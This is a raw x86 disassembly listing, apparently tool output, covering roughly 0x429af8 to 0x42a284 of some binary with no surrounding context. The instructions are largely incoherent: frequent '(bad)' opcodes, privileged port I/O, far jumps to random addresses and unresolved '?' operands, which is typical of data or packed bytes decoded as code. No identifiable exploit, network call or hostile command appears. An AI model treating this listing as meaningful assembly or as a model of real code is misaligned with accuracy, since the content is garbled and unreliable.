  429af8:	jne    0x429a84
  429afa:	add    DWORD PTR [ecx],eax
  429afc:	sbb    bl,bl
  429afe:	out    0x74,eax
  429b00:	add    BYTE PTR [eax],al
  429b02:	add    BYTE PTR [eax],al
  429b04:	add    BYTE PTR [ebp-0x62],al
  429b07:	out    0x15,eax
  429b09:	cdq    
  429b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b0b:	dec    esi
  429b0c:	add    BYTE PTR [edx+0x62],bh
  429b0f:	xor    BYTE PTR [eax],bl
  429b11:	push   cs
  429b12:	aaa    
  429b13:	imul   esp,DWORD PTR [esi+edx*8],0xffffffb5
  429b17:	bound  ecx,QWORD PTR [esp+edi*2]
  429b1a:	and    dh,BYTE PTR [ebx]
  429b1c:	xor    ch,0xb5
  429b1f:	push   cs
  429b20:	call   0x51c52c
  429b25:	fs mov edi,0x623c3261
  429b2b:	xor    BYTE PTR [eax],bl
  429b2d:	push   ecx
  429b2e:	repz jge 0x429b31
  429b31:	test   eax,0x41249330
  429b36:	mov    eax,0x6909000e
  429b3b:	jmp    0x4ee69855
  429b40:	add    BYTE PTR [esi+esi*8],dh
  429b43:	pop    ss
  429b44:	test   DWORD PTR [ebx-0x40],edx
  429b47:	out    0xff,eax
  429b49:	mov    ds:0x90cb939d,al
  429b4e:	mov    bl,0xe4
  429b50:	sbb    edx,DWORD PTR [eax+0x4ead378b]
  429b56:	dec    edi
  429b57:	hlt    
  429b58:	adc    dl,BYTE PTR [ecx-0x2b72855c]
  429b5e:	outs   dx,DWORD PTR ds:[esi]
  429b5f:	or     al,ch
  429b61:	add    edx,ebx
  429b63:	adc    al,BYTE PTR [eax]
  429b65:	mov    ebp,0x540598
  429b6a:	add    BYTE PTR [eax],al
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	mov    ds:0x92e712cb,al
  429b73:	adc    al,0x27
  429b75:	mov    dh,0x2e
  429b77:	mov    dl,BYTE PTR [eax]
  429b79:	add    BYTE PTR ds:0x9087f407,al
  429b7f:	mov    edx,DWORD PTR [eax]
  429b81:	mov    BYTE PTR [ecx+0x1a74d8ca],cl
  429b87:	adc    al,0x53
  429b89:	pop    ebx
  429b8a:	mov    dh,0xf6
  429b8c:	lds    eax,FWORD PTR [eax+0x184ed4]
  429b92:	nop
  429b93:	dec    esp
  429b94:	ret    0x8f52
  429b97:	jmp    0x4c6bf47
  429b9c:	and    DWORD PTR [edi+0x117c11c],eax
  429ba2:	nop
  429ba3:	mov    edx,DWORD PTR [ebp-0x68669b37]
  429ba9:	add    DWORD PTR [edx-0x76],ebp
  429bac:	sub    edx,DWORD PTR [eax]
  429bae:	adc    esi,DWORD PTR [edi]
  429bb0:	push   0x8
  429bb2:	xchg   ecx,eax
  429bb3:	mov    edx,DWORD PTR [eax]
  429bb5:	add    BYTE PTR [ebx+0xc88b1cb],al
  429bbb:	jns    0x429bc5
  429bbd:	add    DWORD PTR [eax-0x2da63475],edx
  429bc3:	mov    ss,WORD PTR [eax]
  429bc5:	sub    DWORD PTR [esi+eax*8-0x4d6ffff1],0x2be1d6a8
  429bd0:	pop    es
  429bd1:	lock add BYTE PTR [eax],al
  429bd4:	add    BYTE PTR [eax],al
  429bd6:	add    BYTE PTR [esi-0x18],bl
  429bd9:	jb     0x429baa
  429bdb:	mov    bl,0xba
  429bdd:	ins    DWORD PTR es:[edi],dx
  429bde:	fbstp  TBYTE PTR [ebx-0x4a2d0259]
  429be4:	mov    dl,0xf5
  429be6:	mov    ss,esp
  429be8:	(bad)  
  429be9:	mov    ecx,0xfc715c2b
  429bee:	cmp    eax,DWORD PTR ds:0x52c019ef
  429bf4:	not    DWORD PTR [ecx]
  429bf6:	shr    bh,0x58
  429bf9:	ss add al,0x9
  429bfc:	fist   WORD PTR [ecx]
  429bfe:	enter  0x182f,0xc0
  429c02:	add    al,0x90
  429c04:	sub    ebp,DWORD PTR [edx]
  429c06:	loopne 0x429be3
  429c08:	cmp    al,BYTE PTR [edi+0x4ab25fa6]
  429c0e:	mov    bh,BYTE PTR [eax-0x4f]
  429c11:	cmc    
  429c12:	add    ebx,DWORD PTR ds:0x9004de51
  429c18:	mov    dl,0x6d
  429c1a:	fdiv   DWORD PTR [ebx-0x4c3f913e]
  429c20:	call   0xa85e:0x9eb3c85e
  429c27:	mov    bl,0xd2
  429c29:	jo     0x429c04
  429c2b:	fild   QWORD PTR [esi+ecx*1]
  429c2e:	pop    es
  429c2f:	or     DWORD PTR [edi],ecx
  429c31:	sbb    ch,ah
  429c33:	adc    al,0x5c
  429c35:	ret    0x14c9
  429c38:	neg    DWORD PTR [ecx]
  429c3a:	aam    0x0
  429c3c:	add    BYTE PTR [eax],al
  429c3e:	add    BYTE PTR [eax],al
  429c40:	dec    edi
  429c41:	sub    eax,0xe25fdfb2
  429c46:	mov    ebp,0xf5b2800b
  429c4b:	stos   DWORD PTR es:[edi],eax
  429c4c:	stos   BYTE PTR es:[edi],al
  429c4d:	jg     0x429c5e
  429c4f:	jmp    0xe5a317e7
  429c54:	push   edx
  429c55:	div    BYTE PTR [edx]
  429c57:	lea    ecx,[edi-0x35161381]
  429c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c5e:	sbb    bh,bh
  429c60:	push   ebx
  429c61:	jg     0x429bf6
  429c63:	sub    DWORD PTR [ecx-0x5f],eax
  429c66:	cdq    
  429c67:	lods   eax,DWORD PTR ds:[esi]
  429c68:	dec    edi
  429c69:	jecxz  0x429ca9
  429c6b:	(bad)  
  429c6c:	push   ds
  429c6d:	mov    bh,0xeb
  429c6f:	fdiv   st(3),st
  429c71:	mov    al,ds:0x7210e94e
  429c76:	sbb    al,0x6c
  429c78:	call   0x8b2bab2e
  429c7d:	push   es
  429c7e:	xor    ebx,DWORD PTR [ecx]
  429c80:	(bad)  
  429c82:	div    eax
  429c84:	jp     0x429d01
  429c86:	in     al,dx
  429c87:	jb     0x429c78
  429c89:	rol    BYTE PTR [esi],cl
  429c8b:	jae    0x429ce8
  429c8d:	jl     0x429c86
  429c8f:	mov    DWORD PTR [ebx+0x7f],0x5d365ec
  429c96:	or     bl,dl
  429c98:	push   ebx
  429c99:	adc    al,0x26
  429c9b:	and    eax,0x6d1bc6f8
  429ca0:	xor    BYTE PTR [ecx+0xe90e],0x0
  429ca7:	add    BYTE PTR [eax],al
  429ca9:	jle    0x429c5c
  429cab:	je     0x429d1d
  429cad:	das    
  429cae:	retf   
  429caf:	es jno 0x429c71
  429cb2:	rol    BYTE PTR [ebx],cl
  429cb4:	sub    BYTE PTR [ecx+esi*4+0xe],0xe9
  429cb9:	and    eax,0xe6421fa3
  429cbe:	jnp    0x429ce2
  429cc0:	adc    DWORD PTR [edi],ecx
  429cc2:	test   BYTE PTR [esi],0x56
  429cc5:	mov    al,ds:0x93a900fa
  429cca:	xor    eax,0x9aed00cf
  429ccf:	xchg   ebx,eax
  429cd0:	push   esp
  429cd1:	lea    ebx,[esi+0x65b3b617]
  429cd7:	sbb    DWORD PTR [esi-0x74c2440d],esi
  429cdd:	ror    ecx,0xf1
  429ce0:	inc    esi
  429ce1:	jns    0x429c95
  429ce3:	xchg   ebx,eax
  429ce4:	call   0xebd6547b
  429ce9:	in     al,dx
  429cea:	retf   0x8417
  429ced:	pop    es
  429cee:	mov    bh,0xe
  429cf0:	add    cl,ah
  429cf2:	xor    BYTE PTR gs:[esp+ebp*8],dh
  429cf6:	mov    eax,0xb0f22f62
  429cfb:	cdq    
  429cfc:	dec    esp
  429cfd:	popf   
  429cfe:	mov    bh,BYTE PTR [edi]
  429d00:	push   edi
  429d01:	data16 addr16 cmp al,0x85
  429d05:	jmp    0xf0c5a957
  429d0a:	mov    ebx,0x3970
  429d0f:	add    BYTE PTR [eax],al
  429d11:	add    BYTE PTR [ebp-0x6e],ah
  429d14:	cmp    BYTE PTR [edi],cl
  429d16:	mov    ebp,0x5cc092f6
  429d1b:	mov    eax,ds:0x63780793
  429d20:	jmp    0xc7058a75
  429d25:	sbb    bh,BYTE PTR [ecx]
  429d27:	mov    ecx,0x92ad89ce
  429d2c:	and    BYTE PTR [ebx+0xf3492ad],cl
  429d32:	scas   al,BYTE PTR es:[edi]
  429d33:	push   0x10
  429d35:	cmp    BYTE PTR [ecx-0x5a],dl
  429d38:	das    
  429d39:	add    cl,ch
  429d3b:	push   ebx
  429d3c:	and    eax,0xa699dbc8
  429d41:	xor    ah,ch
  429d43:	mov    cl,0xe
  429d45:	data16 jb 0x429d36
  429d48:	pop    edi
  429d49:	push   cs
  429d4a:	nop
  429d4b:	jno    0x429d69
  429d4d:	push   ecx
  429d4e:	or     ebx,DWORD PTR [edi-0x74a459c6]
  429d54:	adc    BYTE PTR [eax+edx*8-0x538139ba],al
  429d5b:	pop    ebx
  429d5c:	fwait
  429d5d:	int    0xa8
  429d5f:	call   0xd29d3d
  429d64:	push   esp
  429d65:	test   BYTE PTR [eax+0x26],dl
  429d68:	adc    al,0x87
  429d6a:	aad    0x8b
  429d6c:	mov    edx,0x397b7700
  429d71:	lock nop
  429d73:	mov    edx,DWORD PTR [eax]
  429d75:	lea    eax,[eax]
  429d77:	add    BYTE PTR [eax],al
  429d79:	add    BYTE PTR [eax],al
  429d7b:	or     al,0x77
  429d7d:	nop
  429d7e:	add    BYTE PTR [eax+0x1de7c08b],dl
  429d84:	push   edx
  429d85:	adc    BYTE PTR [eax],al
  429d87:	adc    al,0x4b
  429d89:	mov    esp,0x6c24971f
  429d8e:	and    al,0x10
  429d90:	mov    edx,DWORD PTR [eax]
  429d92:	add    al,cl
  429d94:	rcr    DWORD PTR [esi+0x1d631304],cl
  429d9a:	jne    0x429d34
  429d9c:	mov    WORD PTR [edi-0x64],ds
  429d9f:	je     0x429daa
  429da1:	adc    BYTE PTR [eax],al
  429da3:	nop
  429da4:	cmc    
  429da5:	dec    edi
  429da6:	mov    edi,0xd75f8498
  429dab:	sbb    edx,edi
  429dad:	out    dx,al
  429dae:	daa    
  429daf:	jbe    0x429dc3
  429db1:	les    eax,FWORD PTR [ebx]
  429db3:	mov    eax,0x4c8810d8
  429db8:	outs   dx,DWORD PTR ds:[esi]
  429db9:	jmp    esi
  429dbb:	mov    WORD PTR [ecx],es
  429dbd:	les    esp,FWORD PTR [ebx]
  429dbf:	xchg   DWORD PTR [eax],edx
  429dc1:	lods   al,BYTE PTR ds:[esi]
  429dc2:	and    esi,DWORD PTR [eax-0x53dc2bf0]
  429dc8:	mov    dl,0x5e
  429dca:	jmp    0x429dda
  429dcc:	push   cs
  429dcd:	adc    ch,ah
  429dcf:	xor    DWORD PTR [ecx],ebp
  429dd1:	mov    edx,0x6f147fe7
  429dd6:	add    dl,BYTE PTR ds:0x7fe57d
  429ddc:	mov    dl,0xf5
  429dde:	add    eax,DWORD PTR [eax]
  429de0:	add    BYTE PTR [eax],al
  429de2:	add    BYTE PTR [eax],al
  429de4:	pop    ss
  429de5:	mov    ch,0x72
  429de7:	(bad)  
  429de8:	jae    0x429dc0
  429dea:	xchg   al,dl
  429dec:	mov    ah,bl
  429dee:	mov    ebp,0xe506507e
  429df3:	test   BYTE PTR [eax+0x7c],cl
  429df6:	pushf  
  429df7:	cli    
  429df8:	rcl    esi,cl
  429dfa:	ror    DWORD PTR [eax],1
  429dfc:	add    al,0x73
  429dfe:	rol    BYTE PTR [edx],cl
  429e00:	(bad)  [edx-0x4d09ffa0]
  429e06:	mov    WORD PTR [eax],?
  429e08:	ror    dh,0x70
  429e0b:	mov    edi,0x6de49a73
  429e10:	nop
  429e11:	jmp    0xaa30:0x5c80a41
  429e18:	fcmovnu st,st(1)
  429e1a:	dec    edi
  429e1b:	adc    eax,0xdb3fb637
  429e20:	enter  0xf408,0xda
  429e24:	or     al,0xe7
  429e26:	sbb    esp,ebx
  429e28:	das    
  429e29:	aad    0x32
  429e2b:	add    al,0x90
  429e2d:	stos   DWORD PTR es:[edi],eax
  429e2e:	dec    esp
  429e2f:	sar    BYTE PTR [ebx+0x548925ba],0xd6
  429e36:	and    esp,edx
  429e38:	add    al,0xf7
  429e3a:	shl    DWORD PTR [ebx+0x2c05ae75],1
  429e40:	push   esi
  429e41:	repz imul esi,DWORD PTR [edi],0x5f
  429e45:	jbe    0x429e56
  429e47:	fld    DWORD PTR [eax]
  429e49:	add    BYTE PTR [eax],al
  429e4b:	add    BYTE PTR [eax],al
  429e4d:	adc    BYTE PTR [ebx+0x6d],dh
  429e50:	xlat   BYTE PTR ds:[ebx]
  429e51:	xchg   esi,eax
  429e52:	aas    
  429e53:	push   ebx
  429e54:	adc    eax,0xb93fe2c4
  429e59:	or     bh,dh
  429e5b:	xor    bl,ch
  429e5d:	jecxz  0x429e8d
  429e5f:	pop    ebx
  429e60:	add    eax,0x502693c0
  429e65:	mov    WORD PTR [edx-0x40404272],?
  429e6b:	push   cs
  429e6c:	mov    ebp,0xc314338b
  429e71:	xchg   ebx,eax
  429e72:	fucomip st,st(3)
  429e74:	mov    ecx,0xc54b3577
  429e79:	mov    ?,WORD PTR [ebx+eax*2]
  429e7c:	int    0x83
  429e7e:	xor    al,0x7b
  429e80:	lds    esi,FWORD PTR [ebx+0x34]
  429e83:	push   ebx
  429e84:	int    0x8b
  429e86:	sti    
  429e87:	push   edx
  429e88:	lds    eax,FWORD PTR [edi+0x132bea7c]
  429e8e:	jne    0x429ea3
  429e90:	push   0xffffffd4
  429e92:	stos   BYTE PTR es:[edi],al
  429e93:	xchg   esi,eax
  429e94:	cmp    eax,0x4d95cb30
  429e99:	xor    BYTE PTR [ebx-0x5ccfd26b],bl
  429e9f:	mov    ss,ebx
  429ea1:	das    
  429ea2:	test   al,0x90
  429ea4:	lea    ebp,[eax+0x77]
  429ea7:	in     al,dx
  429ea8:	fs pushw es
  429eab:	sbb    esp,DWORD PTR [edx+0x16]
  429eae:	loopne 0x429e9b
  429eb0:	sbb    DWORD PTR [eax],eax
  429eb2:	add    BYTE PTR [eax],al
  429eb4:	add    BYTE PTR [eax],al
  429eb6:	pushf  
  429eb7:	retf   
  429eb8:	into   
  429eb9:	jo     0x429f02
  429ebb:	iret   
  429ebc:	pop    edx
  429ebd:	jb     0x429f3c
  429ebf:	push   ds
  429ec0:	push   cs
  429ec1:	jmp    0x611fd259
  429ec6:	ins    DWORD PTR es:[edi],dx
  429ec7:	ror    BYTE PTR ds:0xd0aef900,cl
  429ecd:	xchg   cl,dl
  429ecf:	mov    ch,0xe
  429ed1:	add    al,ch
  429ed3:	(bad)  
  429ed4:	nop
  429ed5:	add    BYTE PTR [ecx-0x1a3f6d52],bh
  429edb:	cwde   
  429edc:	pop    ss
  429edd:	mov    dh,0x2f
  429edf:	ja     0x429ef0
  429ee1:	add    BYTE PTR [ecx-0x47a36ed9],ch
  429ee7:	scas   al,BYTE PTR es:[edi]
  429ee8:	push   cs
  429ee9:	mov    DWORD PTR ds:0xa9012f35,esi
  429eef:	scas   al,BYTE PTR es:[edi]
  429ef0:	call   0xef8407b
  429ef5:	add    BYTE PTR [ebx+0x7a],dl
  429ef8:	inc    edx
  429ef9:	(bad)  
  429efa:	out    dx,eax
  429efb:	lods   eax,DWORD PTR ds:[esi]
  429efc:	or     eax,0x102d6900
  429f01:	test   DWORD PTR [ecx-0x38f0feb7],ebp
  429f07:	das    
  429f08:	daa    
  429f09:	add    DWORD PTR [ecx-0x4a],edi
  429f0c:	xchg   ebx,eax
  429f0d:	inc    eax
  429f0e:	popa   
  429f0f:	daa    
  429f10:	xchg   ebx,eax
  429f11:	mov    cs,WORD PTR [ecx-0x51]
  429f14:	push   cs
  429f15:	add    BYTE PTR [edi],bh
  429f17:	mul    DWORD PTR [esi]
  429f19:	add    DWORD PTR [eax],eax
  429f1b:	add    BYTE PTR [eax],al
  429f1d:	add    BYTE PTR [eax],al
  429f1f:	cmp    DWORD PTR [esi+0x6c35c76b],esi
  429f25:	arpl   bp,bx
  429f27:	test   eax,0x9a750dbb
  429f2c:	dec    esp
  429f2d:	sbb    BYTE PTR [ebp+0x50289275],cl
  429f33:	lods   al,BYTE PTR ds:[esi]
  429f34:	jb     0x429f66
  429f36:	pusha  
  429f37:	jns    0x429ef8
  429f39:	add    DWORD PTR [edi+eiz*8+0x75],ebx
  429f3d:	in     al,dx
  429f3e:	xor    BYTE PTR ds:0xd55499ab,0x5d
  429f45:	jb     0x429f53
  429f47:	nop
  429f48:	mov    ch,0x8b
  429f4a:	pop    eax
  429f4b:	clc    
  429f4c:	pop    ecx
  429f4d:	int3   
  429f4e:	jmp    edi
  429f50:	(bad)  
  429f51:	(bad)  
  429f52:	and    edx,DWORD PTR [ebx+eiz*1+0x2]
  429f56:	jecxz  0x429ee8
  429f58:	mov    eax,ebx
  429f5a:	pop    ecx
  429f5b:	ins    DWORD PTR es:[edi],dx
  429f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429f5d:	pop    esp
  429f5f:	mov    esp,0xd300108b
  429f64:	inc    ecx
  429f65:	xchg   edi,eax
  429f66:	icebp  
  429f67:	or     ebx,0xffffffe7
  429f6a:	or     DWORD PTR [edx+ecx*4+0x10],0xc0931d00
  429f72:	dec    edi
  429f73:	inc    eax
  429f74:	sbb    esp,DWORD PTR [ebx]
  429f76:	adc    eax,0xffd05b9c
  429f7b:	sbb    BYTE PTR [ecx],dl
  429f7d:	mov    DWORD PTR [eax],0xc06d8b90
  429f83:	add    BYTE PTR [eax],al
  429f85:	add    BYTE PTR [eax],al
  429f87:	add    BYTE PTR ds:0xd6bfde90,al
  429f8d:	int3   
  429f8e:	bound  eax,QWORD PTR [ecx]
  429f90:	into   
  429f91:	int3   
  429f92:	(bad)  
  429f93:	in     al,dx
  429f94:	test   BYTE PTR [edi+ebp*4],cl
  429f97:	and    ecx,DWORD PTR [ebx+ecx*4+0x18be54bf]
  429f9e:	xchg   edi,eax
  429f9f:	stc    
  429fa0:	push   edi
  429fa1:	dec    edi
  429fa2:	int3   
  429fa3:	and    edx,DWORD PTR [ecx+0xb00108b]
  429fa9:	adc    BYTE PTR [eax],bl
  429fab:	add    DWORD PTR [eax+0x7444998b],edx
  429fb1:	stos   DWORD PTR es:[edi],eax
  429fb2:	xchg   ebp,eax
  429fb3:	adc    DWORD PTR [edx+ecx*4-0x30f6fff0],0xffffffee
  429fbb:	daa    
  429fbc:	add    eax,0x9000e408
  429fc1:	mov    eax,eax
  429fc3:	cli    
  429fc4:	popf   
  429fc5:	mov    dl,0x85
  429fc7:	adc    DWORD PTR [eax-0x4e],edx
  429fca:	enter  0xb926,0x49
  429fce:	push   ds
  429fcf:	add    edx,DWORD PTR [eax+0x117dccb2]
  429fd5:	mov    bl,0xf5
  429fd7:	add    edx,DWORD PTR [edi]
  429fd9:	xor    DWORD PTR [edx],eax
  429fdb:	add    edx,DWORD PTR [eax+0x73bfbbb2]
  429fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429fe2:	cmc    
  429fe3:	mov    BYTE PTR [edx+ecx*2+0x2e8b587b],ah
  429fea:	lods   al,BYTE PTR ds:[esi]
  429feb:	add    al,BYTE PTR [eax]
  429fed:	add    BYTE PTR [eax],al
  429fef:	add    BYTE PTR [eax],al
  429ff1:	nop
  429ff2:	mov    dl,0x70
  429ff4:	dec    eax
  429ff5:	mov    eax,0xab34567a
  429ffa:	sub    eax,0xe9150436
  429fff:	test   BYTE PTR [ebx],0x90
  42a002:	les    eax,FWORD PTR [edi]
  42a004:	mov    esp,esp
  42a006:	into   
  42a007:	enter  0xcc8b,0xce
  42a00b:	out    0x4,al
  42a00d:	inc    edx
  42a00e:	imul   ebx,DWORD PTR [edi-0x39],0xffffffb3
  42a012:	call   0x2d72:0xd35baf70
  42a019:	fwait
  42a01a:	cs adc eax,0xfcb29003
  42a020:	ins    DWORD PTR es:[edi],dx
  42a021:	shl    BYTE PTR [esi-0x74a8777b],cl
  42a027:	pusha  
  42a028:	cmc    
  42a029:	inc    edi
  42a02a:	js     0x42a0a7
  42a02c:	inc    esp
  42a02d:	mov    ebp,DWORD PTR [esi]
  42a02f:	aad    0x4
  42a031:	nop
  42a032:	mov    dl,0xf4
  42a034:	jp     0x42a015
  42a036:	sahf   
  42a037:	jo     0x429ff9
  42a039:	jae    0x429fd5
  42a03b:	pusha  
  42a03c:	cli    
  42a03d:	push   ss
  42a03e:	out    0xb9,eax
  42a040:	in     al,0xc5
  42a042:	ja     0x42a053
  42a044:	cmp    ah,BYTE PTR [edx+eiz*8+0x2e9c17eb]
  42a04b:	iret   
  42a04c:	sbb    eax,0x58e4c792
  42a051:	lea    ebp,[edx]
  42a053:	pop    ebx
  42a054:	int    0x0
  42a056:	add    BYTE PTR [eax],al
  42a058:	add    BYTE PTR [eax],al
  42a05a:	test   DWORD PTR [ecx],ebp
  42a05c:	arpl   bp,ax
  42a05e:	jg     0x429fef
  42a060:	outs   dx,BYTE PTR ds:[esi]
  42a061:	xchg   BYTE PTR [ecx-0x3e],bh
  42a064:	add    al,0x29
  42a066:	mov    WORD PTR [ecx],?
  42a068:	dec    esi
  42a069:	into   
  42a06a:	xchg   ebx,eax
  42a06b:	mov    dl,0x27
  42a06d:	test   al,0x93
  42a06f:	sub    ecx,DWORD PTR [esi+0x1bb293e9]
  42a075:	sbb    esi,DWORD PTR gs:[ebx+0x6a2ee90e]
  42a07c:	mov    es,WORD PTR [eax-0x7f]
  42a07f:	ror    DWORD PTR [esi],cl
  42a081:	jmp    0xe9d8cf18
  42a086:	xchg   ebx,eax
  42a087:	mov    dl,0x8f
  42a089:	inc    eax
  42a08a:	stos   BYTE PTR es:[edi],al
  42a08b:	stos   DWORD PTR es:[edi],eax
  42a08c:	xchg   edx,eax
  42a08d:	sbb    cl,BYTE PTR [edx+esi*4-0x596295f2]
  42a094:	bound  esp,QWORD PTR [edx-0xecd110a]
  42a09a:	out    dx,al
  42a09b:	imul   ebx,DWORD PTR [edi+edx*2],0x58
  42a09f:	jae    0x42a0ac
  42a0a1:	cdq    
  42a0a2:	jnp    0x42a06b
  42a0a4:	out    0xfe,eax
  42a0a6:	mov    ds:0x6101dc2f,al
  42a0ab:	sub    ah,0xee
  42a0ae:	add    BYTE PTR [ebx+0x4b],0xe8
  42a0b2:	xchg   ebx,eax
  42a0b3:	mov    dl,0xeb
  42a0b5:	hlt    
  42a0b6:	inc    ebx
  42a0b7:	test   al,0x4e
  42a0b9:	jmp    0xfb75876b
  42a0be:	add    BYTE PTR [eax],al
  42a0c0:	add    BYTE PTR [eax],al
  42a0c2:	add    BYTE PTR [esi+0x3d0032fe],ah
  42a0c8:	cmc    
  42a0c9:	inc    edx
  42a0ca:	and    al,0x3a
  42a0cc:	cmc    
  42a0cd:	push   edx
  42a0ce:	and    al,0xe8
  42a0d0:	ror    dh,0x88
  42a0d3:	lods   eax,DWORD PTR ds:[esi]
  42a0d4:	mov    bh,bh
  42a0d6:	cmp    ebp,ebx
  42a0d8:	mov    bl,0x6c
  42a0da:	cmp    dl,BYTE PTR [esi]
  42a0dc:	(bad)  
  42a0dd:	out    0x80,eax
  42a0df:	add    ebp,DWORD PTR [ebp+0x487a5761]
  42a0e5:	adc    al,0x0
  42a0e7:	fnstsw WORD PTR [esi]
  42a0e9:	jmp    0x2c2e8261
  42a0ee:	or     al,0x6
  42a0f0:	mov    esp,gs
  42a0f2:	push   DWORD PTR [esi]
  42a0f4:	call   0x62f3:0xb2e9131e
  42a0fb:	xchg   esp,eax
  42a0fc:	outs   dx,DWORD PTR ds:[esi]
  42a0fd:	xor    DWORD PTR [eax],eax
  42a0ff:	mov    ecx,0xed3d8246
  42a104:	mov    ebp,esp
  42a106:	call   edi
  42a108:	mov    al,0x29
  42a10a:	inc    esi
  42a10b:	mov    gs,WORD PTR [esi-0x7c818bf2]
  42a111:	aas    
  42a112:	daa    
  42a113:	jns    0x42a0c7
  42a115:	popa   
  42a116:	test   DWORD PTR [ebx],eax
  42a118:	xor    BYTE PTR ss:[edx],dl
  42a11b:	in     eax,dx
  42a11c:	mov    dh,0x61
  42a11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a11f:	repnz shl ebp,0x35
  42a123:	xchg   esi,eax
  42a124:	shl    bh,0x8a
  42a127:	add    BYTE PTR [eax],al
  42a129:	add    BYTE PTR [eax],al
  42a12b:	add    BYTE PTR ds:0x2589ff8e,ch
  42a131:	mov    ds,WORD PTR [edx]
  42a133:	mov    ecx,ebp
  42a135:	lea    eax,[eax]
  42a137:	(bad)  
  42a138:	jnp    0x42a133
  42a13a:	inc    edx
  42a13b:	and    al,0x3a
  42a13d:	xchg   edi,eax
  42a13e:	add    BYTE PTR [eax+eax*1-0x6f7cf6c5],0xe0
  42a146:	mov    ds:0xa4511aff,al
  42a14b:	adc    BYTE PTR [eax],ch
  42a14d:	sahf   
  42a14e:	xchg   bl,bh
  42a150:	pop    ss
  42a151:	add    DWORD PTR [esi+0x108b9154],edx
  42a157:	jg     0x42a105
  42a159:	xor    edx,DWORD PTR [ebx]
  42a15b:	out    0x96,eax
  42a15d:	mov    ch,0xa
  42a15f:	mov    edi,edx
  42a161:	adc    al,0x1e
  42a163:	inc    ebp
  42a164:	stos   DWORD PTR es:[edi],eax
  42a165:	in     al,dx
  42a166:	fiadd  DWORD PTR [eax]
  42a168:	nop
  42a169:	mov    ecx,DWORD PTR [edi]
  42a16b:	jle    0x42a1cc
  42a16d:	sub    eax,0x450bfb1e
  42a172:	or     ecx,DWORD PTR [ebp-0x6f]
  42a175:	mov    edx,DWORD PTR [eax]
  42a177:	lea    ecx,[edi]
  42a179:	dec    eax
  42a17a:	adc    DWORD PTR [eax],eax
  42a17c:	nop
  42a17d:	cmp    ebx,DWORD PTR [edi]
  42a17f:	adc    eax,0xffd079a8
  42a184:	dec    esi
  42a185:	cmp    eax,0xd01356dd
  42a18a:	(bad)  
  42a18b:	mov    esi,0x54c31a41
  42a190:	add    BYTE PTR [eax],al
  42a192:	add    BYTE PTR [eax],al
  42a194:	add    BYTE PTR [esi],bh
  42a196:	sbb    al,0x6b
  42a198:	jl     0x42a14e
  42a19a:	pop    edi
  42a19b:	imul   esi,ecx,0x1b
  42a19e:	dec    esp
  42a19f:	add    BYTE PTR [ebp+0x947c50],al
  42a1a5:	xchg   ecx,eax
  42a1a6:	mov    edx,DWORD PTR [eax]
  42a1a8:	repnz xlat BYTE PTR ds:[ebx]
  42a1aa:	adc    BYTE PTR [ecx],0xb
  42a1ad:	or     al,0xbd
  42a1af:	adc    al,BYTE PTR [eax]
  42a1b1:	nop
  42a1b2:	add    esi,edx
  42a1b4:	sbb    BYTE PTR [esi-0x3d],dl
  42a1b7:	imul   ebp,DWORD PTR [edx+0x108a8c],0xffffffdd
  42a1be:	adc    edx,edi
  42a1c0:	and    esi,DWORD PTR [eax-0x4e]
  42a1c3:	or     BYTE PTR [ebp+0x3b],cl
  42a1c6:	lahf   
  42a1c7:	lds    edx,FWORD PTR ds:0x9200b2d0
  42a1cd:	enter  0xf5b3,0x3
  42a1d1:	mov    esi,DWORD PTR [ecx]
  42a1d3:	xchg   esi,eax
  42a1d4:	add    edx,DWORD PTR [eax+0x648960b2]
  42a1da:	mov    bl,0xf5
  42a1dc:	add    ecx,DWORD PTR [edi]
  42a1de:	(bad)  
  42a1df:	cmp    eax,0x1efded86
  42a1e4:	jge    0x42a1ab
  42a1e6:	mov    esi,edx
  42a1e8:	push   eax
  42a1e9:	jmp    0x42a25f
  42a1eb:	jp     0x42a230
  42a1ed:	pop    esp
  42a1ee:	mov    ah,0x70
  42a1f0:	(bad)  
  42a1f1:	outs   dx,DWORD PTR ds:[esi]
  42a1f2:	sub    edi,DWORD PTR [edx]
  42a1f4:	call   0xb7f8d180
  42a1f9:	add    BYTE PTR [eax],al
  42a1fb:	add    BYTE PTR [eax],al
  42a1fd:	add    BYTE PTR [esi-0x3f],bh
  42a200:	scas   al,BYTE PTR es:[edi]
  42a201:	jmp    0xa5a1:0xc64aa254
  42a208:	mov    ecx,0x11ee0942
  42a20d:	sbb    BYTE PTR [edi],ch
  42a20f:	jb     0x42a20b
  42a211:	popf   
  42a212:	and    edx,0x4a
  42a215:	enter  0xe285,0x54
  42a219:	push   ss
  42a21a:	sub    al,0x9c
  42a21c:	mov    ch,0x3
  42a21e:	movq   mm6,mm2
  42a221:	xchg   BYTE PTR [eax-0x2],dl
  42a224:	retf   0xcc7c
  42a227:	into   
  42a228:	jmp    0xea116eaa
  42a22d:	jmp    0x42a1ff
  42a22f:	scas   eax,DWORD PTR es:[edi]
  42a230:	mov    esp,edi
  42a232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a233:	mov    bh,0x7b
  42a235:	retf   
  42a236:	nop
  42a237:	mov    dl,0xf5
  42a239:	mov    ch,0x30
  42a23b:	mov    BYTE PTR [ecx+0xecec430],ch
  42a241:	fld    st(4)
  42a243:	test   DWORD PTR [si+0x7941],0xd04872ec
  42a24c:	(bad)  
  42a24d:	imul   edi,esp,0x915d0eab
  42a253:	ja     0x42a2b4
  42a255:	loope  0x42a269
  42a257:	adc    ebx,DWORD PTR [ebx]
  42a259:	jmp    0xda613fc4
  42a25e:	shl    DWORD PTR [ebx-0x67],cl
  42a261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a262:	add    BYTE PTR [eax],al
  42a264:	add    BYTE PTR [eax],al
  42a266:	add    BYTE PTR [esi+ecx*8+0x2bafae7f],ah
  42a26d:	xchg   ebp,eax
  42a26e:	cmp    eax,0x6a0eb28d
  42a273:	clc    
  42a274:	sbb    ecx,DWORD PTR [edi]
  42a276:	rcl    BYTE PTR ds:0x93e90ddb,cl
  42a27c:	and    eax,0xb28cc5bd
  42a281:	push   cs
  42a282:	cmc    
  42a283:	xchg   esi,eax
  42a284:	sub    ebx,ebp
